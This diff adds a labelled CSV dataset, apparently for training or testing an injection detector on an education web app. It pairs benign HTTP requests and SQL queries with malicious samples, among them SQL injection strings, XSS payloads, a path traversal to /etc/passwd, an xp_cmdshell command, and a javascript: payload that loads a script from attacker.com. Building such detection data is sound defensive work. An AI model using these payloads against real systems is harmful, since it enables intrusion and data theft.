@@ -1,0 +1,21 @@
+payload,label
+"SELECT * FROM users WHERE username = 'admin' AND password = 'password'",1
+"<script>alert(1)</script>",1
+"DROP TABLE students;",1
+"UNION SELECT username, password FROM admin_users",1
+"OR 1=1--",1
+"GET /login HTTP/1.1",0
+"POST /submit_assignment HTTP/1.1\nHost: edu.tn",0
+"<img src=x onerror=alert('XSS')>",1
+"search=test%20AND%201=1",1
+"SELECT grade FROM grades WHERE student_id = 123",0
+"UPDATE courses SET title = 'Math 101' WHERE id = 1",0
+"../../../../etc/passwd",1
+"admin' --",1
+"GET /api/courses/101 HTTP/1.1",0
+"POST /api/messages HTTP/1.1\nContent-Type: application/json\n\n{\"text\": \"Hello class!\"}",0
+"javascript:eval('var a=document.createElement(\'script\');a.src=\'http://attacker.com/xss.js\';document.body.appendChild(a)')",1
+"SELECT id, name FROM teachers WHERE department = 'Science'",0
+"' OR '1'='1",1
+"1; EXEC xp_cmdshell('ping 127.0.0.1')",1
+"GET /images/logo.png HTTP/1.1",0
